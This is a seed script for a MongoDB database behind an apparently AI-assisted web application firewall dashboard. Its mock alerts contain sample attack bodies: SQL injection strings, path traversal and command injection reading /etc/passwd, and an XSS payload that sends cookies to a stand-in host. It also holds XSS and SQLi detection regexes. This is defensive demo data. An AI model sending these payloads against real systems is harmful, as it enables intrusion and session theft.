const mongoose = require('mongoose');

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/aria_db';

const now = new Date();
function randomTimeAgo(hours) {
    return new Date(now.getTime() - Math.floor(Math.random() * hours * 60 * 60 * 1000));
}

// ---------------- ALERTS ----------------
const mockAlerts = [
    {
        id: "req-mock-001",
        timestamp: randomTimeAgo(1),
        sourceIP: "103.45.12.99",
        method: "POST",
        path: "/api/transfer",
        headers: {},
        body: '{"account": "12345", "amount": 9999999999, "note": "DROP TABLE transactions;"}',
        userAgent: "Mozilla/5.0",
        aiDecision: "block",
        aiReasoning: "Multiple SQL injection keywords detected alongside anomalous financial amounts.",
        detectionSources: ["regex", "llm"],
        regexMatches: ["sqli", "bankingthreats"],
        category: "sqli",
        fidelityScore: 94,
        scores: { regex: 0.9, llm: 0.95, anomaly: 0.8, ueba: 0.2 },
        severity: "critical",
        triageStatus: "pending",
        serviceName: "Demo Banking App"
    },
    {
        id: "req-mock-002",
        timestamp: randomTimeAgo(2),
        sourceIP: "45.22.19.111",
        method: "POST",
        path: "/api/login",
        headers: {},
        body: '{"username": "admin", "password": "\' OR 1=1--"}',
        userAgent: "curl/7.68.0",
        aiDecision: "block",
        aiReasoning: "Classic authentication bypass attempt using SQL injection.",
        detectionSources: ["regex", "llm"],
        regexMatches: ["sqli"],
        category: "credential_stuffing",
        fidelityScore: 88,
        scores: { regex: 0.8, llm: 0.9, anomaly: 0.1, ueba: 0.1 },
        severity: "high",
        triageStatus: "escalated",
        serviceName: "Demo Banking App"
    },
    {
        id: "req-mock-003",
        timestamp: randomTimeAgo(5),
        sourceIP: "192.168.1.105",
        method: "GET",
        path: "/api/accounts/balance/../../../etc/passwd",
        headers: {},
        body: "",
        userAgent: "Mozilla/5.0",
        aiDecision: "block",
        aiReasoning: "Path traversal attempt to access sensitive system files.",
        detectionSources: ["regex"],
        regexMatches: ["traversal"],
        category: "traversal",
        fidelityScore: 75,
        scores: { regex: 0.8, llm: 0.4, anomaly: 0.1, ueba: 0.1 },
        severity: "high",
        triageStatus: "approved",
        serviceName: "Demo Banking App"
    },
    {
        id: "req-mock-004",
        timestamp: randomTimeAgo(12),
        sourceIP: "55.10.122.9",
        method: "POST",
        path: "/api/users/profile",
        headers: {},
        body: '{"profile": "<script>fetch(\'http://bad.com?c=\'+document.cookie)</script>"}',
        userAgent: "Mozilla/5.0",
        aiDecision: "block",
        aiReasoning: "Cross-Site Scripting (XSS) payload to steal session cookies.",
        detectionSources: ["regex", "llm"],
        regexMatches: ["xss"],
        category: "xss",
        fidelityScore: 85,
        scores: { regex: 0.9, llm: 0.7, anomaly: 0.2, ueba: 0.1 },
        severity: "high",
        triageStatus: "pending",
        serviceName: "Demo Banking App"
    },
    {
        id: "req-mock-005",
        timestamp: randomTimeAgo(0.5),
        sourceIP: "99.102.33.21",
        method: "GET",
        path: "/api/balance/7732",
        headers: {},
        body: "",
        userAgent: "Mozilla/5.0",
        aiDecision: "allow",
        aiReasoning: "Sequential account enumeration detected, but low confidence of actual breach.",
        detectionSources: ["ueba"],
        regexMatches: [],
        category: "account_enumeration",
        fidelityScore: 42,
        scores: { regex: 0.1, llm: 0.3, anomaly: 0.6, ueba: 0.7 },
        severity: "medium",
        triageStatus: "pending",
        serviceName: "Demo Banking App"
    },
    {
        id: "req-mock-006",
        timestamp: randomTimeAgo(24),
        sourceIP: "11.22.33.44",
        method: "POST",
        path: "/api/transfer",
        headers: {},
        body: '{"account": "regular", "amount": 50}',
        userAgent: "Mozilla/5.0",
        aiDecision: "allow",
        aiReasoning: "Normal transaction behavior.",
        detectionSources: ["none"],
        regexMatches: [],
        category: "none",
        fidelityScore: 5,
        scores: { regex: 0.0, llm: 0.0, anomaly: 0.0, ueba: 0.0 },
        severity: "info",
        triageStatus: "auto-resolved",
        serviceName: "Demo Banking App"
    },
    {
        id: "req-mock-007",
        timestamp: randomTimeAgo(3),
        sourceIP: "185.199.108.153",
        method: "POST",
        path: "/api/admin/config",
        headers: {},
        body: '{"cmd": "whoami; cat /etc/passwd"}',
        userAgent: "PostmanRuntime/7.28.4",
        aiDecision: "block",
        aiReasoning: "Command injection payload targeting admin endpoint.",
        detectionSources: ["regex", "llm"],
        regexMatches: ["commandinjection"],
        category: "command_injection",
        fidelityScore: 98,
        scores: { regex: 0.95, llm: 0.98, anomaly: 0.5, ueba: 0.3 },
        severity: "critical",
        triageStatus: "approved",
        serviceName: "Demo Banking App"
    }
];

// Generate extra bulk rows for charts
for(let i=8; i<=30; i++) {
    mockAlerts.push({
        id: `bulk-mock-${i}`,
        timestamp: randomTimeAgo(72),
        sourceIP: `203.0.113.${i}`,
        method: i % 2 === 0 ? "POST" : "GET",
        path: "/api/login",
        headers: {},
        body: "",
        userAgent: "Mozilla/5.0",
        aiDecision: i % 3 === 0 ? "block" : "allow",
        aiReasoning: "Automated baseline generation data.",
        detectionSources: [],
        regexMatches: [],
        category: i % 3 === 0 ? "credential_stuffing" : "none",
        fidelityScore: i % 3 === 0 ? (60 + i) : (10 + i%10),
        scores: { regex: 0.1, llm: 0.1, anomaly: 0.1, ueba: 0.1 },
        severity: i % 3 === 0 ? "medium" : "info",
        triageStatus: i % 5 === 0 ? "pending" : "auto-resolved",
        serviceName: "Demo Banking App"
    });
}

// ---------------- COMPREHENSIVE SEED ----------------
const mockApps = [
    {
        name: "Retail Banking Portal",
        domain: "retail.bank.local",
        ports: [{ protocol: "https", port: "443" }],
        upstreams: ["http://10.0.0.51"],
        type: "Reverse Proxy",
        defenseMode: "Defense",
        defenseStatus: true,
        loggingEnabled: true,
        aiModel: "mistral",
        aiSystemPrompt: "You are protecting the retail banking interface from fraud.",
        createdAt: new Date()
    },
    {
        name: "Internal HR System",
        domain: "hr.bank.local",
        ports: [{ protocol: "http", port: "80" }],
        upstreams: ["http://10.0.0.52"],
        type: "Reverse Proxy",
        defenseMode: "Audited",
        defenseStatus: true,
        loggingEnabled: true,
        aiModel: "mistral",
        aiSystemPrompt: "You are protecting an internal HR portal.",
        createdAt: new Date()
    }
];

const mockIncidents = [
    {
        title: "Distributed Credential Stuffing Campaign",
        description: "Multiple IPs attempting rapid login variations using leaked credentials",
        category: "credential_stuffing",
        severity: "critical",
        status: "investigating",
        alertIds: [],
        alertCount: 45,
        sourceIPs: ["192.168.1.100", "203.0.113.45"],
        targetEndpoints: ["/api/login", "/auth"],
        attackStage: "reconnaissance",
        timeRange: { start: randomTimeAgo(48), end: randomTimeAgo(2) },
        avgFidelity: 92.5,
        maxFidelity: 98,
        correlationRule: "High-Volume Authentication Failures",
        assignedTo: "Alice_SOC",
        createdAt: randomTimeAgo(48),
        updatedAt: randomTimeAgo(2)
    },
    {
        title: "SQL Injection on Legacy Portal",
        description: "Blind SQLi attempts mapped against the legacy reports system.",
        category: "sql_injection",
        severity: "high",
        status: "open",
        alertIds: [],
        alertCount: 12,
        sourceIPs: ["45.33.22.11"],
        targetEndpoints: ["/api/reports"],
        attackStage: "exploitation",
        timeRange: { start: randomTimeAgo(12), end: randomTimeAgo(1) },
        avgFidelity: 89.1,
        maxFidelity: 94,
        correlationRule: "SQL Syntax Injection Sequence",
        createdAt: randomTimeAgo(12),
        updatedAt: randomTimeAgo(1)
    }
];

const mockPlaybooks = [
    {
        title: "Credential Stuffing Response Plan",
        generatedBy: "llm",
        category: "credential_stuffing",
        steps: [
            { order: 1, action: "Identify related source IPs and temporarily blacklist them.", assignee: "SOC-L1", estimatedTime: "15m", verification: "Check WAF drop logs", automated: true, status: "completed", completedAt: randomTimeAgo(1) },
            { order: 2, action: "Force password reset for all target accounts.", assignee: "IT-Ops", estimatedTime: "2h", verification: "Check AD sync", automated: false, status: "pending" },
            { order: 3, action: "Enable rate limiting on /api/login specifically.", assignee: "SOC-L2", estimatedTime: "30m", verification: "Test with Postman requests", automated: true, status: "in_progress" }
        ],
        estimatedResolutionTime: "3h",
        regulatoryRequirements: ["PCI-DSS 8.1.6", "RBI CSCRF 5.4"],
        status: "in_progress",
        llmModel: "mistral",
        llmPrompt: "Generate a playbook for a distributed credential stuffing attack on the login portal...",
        createdAt: randomTimeAgo(40),
        updatedAt: randomTimeAgo(1)
    }
];

const mockEvolutions = [
    {
        type: "regex",
        description: "Added strict pattern for Union-Based SQLi",
        reason: "Missed 3 advanced attacks last week on reporting portal",
        previousValue: "/union.*select/i",
        proposedValue: "/(?:union\\s+(?:all\\s+)?select|\\bselect\\b.*?\\bfrom\\b)/i",
        trigger: "auto_tune",
        validationScore: 98.4,
        validationDetails: { testCases: 1000, passed: 984, failed: 16, falsePositiveRate: 0.01, falseNegativeRate: 0.02 },
        status: "deployed",
        deployedAt: randomTimeAgo(5),
        performanceMetrics: { preChangeFPRate: 0.05, postChangeFPRate: 0.01, preChangeTPRate: 0.90, postChangeTPRate: 0.98 },
        affectedModule: "gateway-regex",
        createdBy: "aria-agent",
        approvedBy: "Bob_SOC",
        createdAt: randomTimeAgo(10),
        updatedAt: randomTimeAgo(5)
    },
    {
        type: "threshold",
        description: "Lowered Fidelity Threshold for XSS",
        reason: "XSS campaigns evolving dynamically, needs proactive flagging.",
        previousValue: { xssFidelityRequirement: 90 },
        proposedValue: { xssFidelityRequirement: 85 },
        trigger: "analysis",
        validationScore: 93.0,
        validationDetails: { testCases: 500, passed: 465, failed: 35, falsePositiveRate: 0.04, falseNegativeRate: 0.03 },
        status: "monitoring",
        monitoringStartedAt: randomTimeAgo(2),
        affectedModule: "fidelity-weights",
        createdBy: "aria-agent",
        createdAt: randomTimeAgo(4),
        updatedAt: randomTimeAgo(2)
    }
];

const mockLearnedPatterns = [
    {
        pattern: "(?i)(?:<script.*?>|onload=|onerror=)",
        flags: "ig",
        category: "xss",
        description: "Matches common inline JS execution vectors",
        confidence: 0.92,
        source: "evolved",
        generatedFrom: ["req-mock-1", "req-mock-2"],
        validationResults: { truePositives: 420, falsePositives: 2, trueNegatives: 5000, falseNegatives: 12 },
        status: "active",
        deployedAt: randomTimeAgo(24),
        hitCount: 145,
        falsePositiveCount: 1,
        createdAt: randomTimeAgo(30),
        updatedAt: randomTimeAgo(24)
    }
];

const mockEvents = [
    {
        id: "EV-" + Math.floor(1000 + Math.random() * 9000),
        time: randomTimeAgo(1).toISOString(),
        ip: "103.45.12.99",
        type: "SQL Injection Detection",
        action: "Escalated",
        severity: "High",
        createdAt: randomTimeAgo(1)
    },
    {
        id: "EV-" + Math.floor(1000 + Math.random() * 9000),
        time: randomTimeAgo(2).toISOString(),
        ip: "192.168.1.100",
        type: "Rate Limit Exceeded",
        action: "Blocked",
        severity: "Medium",
        createdAt: randomTimeAgo(2)
    }
];

async function seed() {
    try {
        console.log("Connecting to MongoDB at", MONGODB_URI);
        await mongoose.connect(MONGODB_URI);
        console.log("Connected.");
        
        const db = mongoose.connection.db;

        console.log("Clearing Existing Collections...");
        await db.collection('alerts').deleteMany({});
        await db.collection('protectedservices').deleteMany({});
        await db.collection('incidents').deleteMany({});
        await db.collection('playbooks').deleteMany({});
        await db.collection('evolutionchanges').deleteMany({});
        await db.collection('learnedpatterns').deleteMany({});
        await db.collection('events').deleteMany({});

        console.log("Seeding Alerts...");
        await db.collection('alerts').insertMany(mockAlerts);

        console.log("Seeding Protected Services...");
        await db.collection('protectedservices').insertMany(mockApps);

        console.log("Seeding Incidents...");
        const insertedIncidents = await db.collection('incidents').insertMany(mockIncidents);
        
        // Update playbook incident reference ID
        mockPlaybooks[0].incidentId = Object.values(insertedIncidents.insertedIds)[0];

        console.log("Seeding Playbooks...");
        await db.collection('playbooks').insertMany(mockPlaybooks);

        console.log("Seeding Evolution Changes...");
        await db.collection('evolutionchanges').insertMany(mockEvolutions);

        console.log("Seeding Learned Patterns...");
        await db.collection('learnedpatterns').insertMany(mockLearnedPatterns);

        console.log("Seeding Events...");
        await db.collection('events').insertMany(mockEvents);

        console.log("All new mock data successfully populated!");
    } catch (err) {
        console.error("Error during seeding:", err);
    } finally {
        await mongoose.disconnect();
        console.log("Disconnected.");
    }
}

seed();
